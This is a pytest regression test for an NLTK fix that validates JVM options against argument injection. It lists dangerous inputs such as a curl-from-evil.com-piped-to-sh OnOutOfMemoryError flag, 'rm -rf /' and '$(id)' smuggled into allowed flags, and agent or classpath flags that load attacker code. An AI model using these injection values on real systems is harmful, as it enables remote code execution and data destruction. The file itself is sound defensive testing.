"""
Regression test for GHSA-m4rf (incomplete fix of CVE-2026-12841, CWE-88).

Two defects are covered:

1. ``config_java()`` validated the *global* java options, but ``java()``'s
   per-call ``options`` parameter reached ``subprocess.Popen`` without
   validation, so a caller could inject a dangerous JVM flag on any
   Stanford/CoreNLP wrapper call. ``java()`` now validates per-call options too.

2. The validator itself blanket-allowed the ``-XX:`` prefix (``-XX:OnError=`` /
   ``-XX:OnOutOfMemoryError=`` are executed as shell commands by the JVM) and all
   ``-D`` system properties (e.g. ``-Djava.ext.dirs``). It is now a minimal
   allowlist of exactly what NLTK and the Stanford CoreNLP docs use: heap/stack
   sizing, ``-verbose``, ``-server``/``-client`` and ``--add-modules``. Anything
   else (including ``-XX:`` and ``-D``) is rejected; a caller that vouches for an
   unlisted flag passes it via ``java(trusted_raw_options=...)``.
"""

import pytest

from nltk import internals


@pytest.fixture
def stub_java_bin(monkeypatch):
    # Avoid config_java()'s binary search so the call reaches option validation.
    monkeypatch.setattr(internals, "_java_bin", "/usr/bin/java")
    monkeypatch.setattr(internals, "_java_options", [])


DANGEROUS = [
    # program-changing / agent / argfile flags
    ["-javaagent:/tmp/evil.jar"],
    ["-agentlib:jdwp=transport=dt_socket"],
    ["-agentpath:/tmp/evil.so"],
    "-Xrunjdwp:transport=dt_socket,server=y",
    ["@/tmp/argfile"],
    ["-jar", "/tmp/evil.jar"],
    # -XX: command-execution flags (JVM runs these on error / OOM) -- verified
    # live: -XX:OnOutOfMemoryError executed the injected command.
    ["-XX:OnError=touch /tmp/pwned"],
    ["-XX:OnOutOfMemoryError=curl evil.com|sh"],
    ["-XX:OnError=/bin/reboot"],
    ["-XX:onerror=reboot"],
    ["-XX:+UnlockDiagnosticVMOptions"],
    ["-XX:ErrorFile=/tmp/e"],
    ["-XX:ParallelGCThreads=1"],  # even a benign -XX: is rejected (use escape hatch)
    # -D system properties: not needed by NLTK/CoreNLP and can load code.
    ["-Dfile.encoding=UTF-8"],
    ["-Djava.ext.dirs=/tmp/evil"],
    ["-Djava.rmi.server.codebase=http://evil/"],
    ["-Djava.system.class.loader=Evil"],
    # module path could point at attacker code (only --add-modules is allowed)
    ["--module-path=/tmp/evil"],
    ["-p", "/tmp/evil"],
    # --add-modules with a non-module-list value (shell metachars / path)
    ["--add-modules", "java.se.ee; rm -rf /"],
    ["--add-modules", "/etc/passwd"],
    ["--add-modules=;id"],
    # whitespace / control / shell-metachar smuggling on an allowed prefix
    ["-Xmx512m ; rm -rf /"],
    ["-Xmx$(id)"],
    ["-verbose:gc\n-XX:OnError=x"],
    ["-Xmx512m\x00-XX:OnError=id"],
]


@pytest.mark.parametrize("opts", DANGEROUS)
def test_java_per_call_options_reject_injection(stub_java_bin, opts):
    """Per-call dangerous JVM flags must be refused before Popen runs."""
    with pytest.raises(ValueError):
        internals.java(["SomeMainClass"], classpath=".", options=opts)


SAFE = [
    # heap / stack sizing -- everything NLTK's wrappers and CoreNLP docs pass
    ["-Xmx512m"],
    ["-mx4g"],
    ["-mx2g"],
    ["-mx1000m"],
    ["-mx20m"],
    ["-Xmx1024m"],
    ["-Xms128m"],
    ["-Xss4m"],
    ["-server"],
    ["-client"],
    ["-verbose:gc"],
    # --add-modules java.se.ee is required by CoreNLP on JDK 9-11 (both forms)
    ["--add-modules", "java.se.ee"],
    ["--add-modules=java.se.ee,java.xml.bind"],
]


@pytest.mark.parametrize("opts", SAFE)
def test_java_per_call_options_allow_safe(stub_java_bin, opts):
    """The minimal allowlist must accept every flag NLTK and CoreNLP actually
    use. (validate directly; the subsequent Popen would fail on the stub bin.)"""
    internals._validate_java_options(opts)


def test_trusted_raw_options_bypass_validation_but_default_path_does_not(
    stub_java_bin,
):
    """The escape hatch appends caller-vouched flags without validation, while the
    ordinary ``options`` path still rejects the same flag."""
    # options= is validated -> rejected
    with pytest.raises(ValueError):
        internals.java(["Main"], classpath=".", options=["-XX:ParallelGCThreads=1"])
    # trusted_raw_options is NOT validated: it reaches the command (the call then
    # fails at the stub java binary, not at the security gate).
    with pytest.raises(Exception) as exc:
        internals.java(
            ["Main"], classpath=".", trusted_raw_options=["-XX:ParallelGCThreads=1"]
        )
    assert not isinstance(exc.value, ValueError)
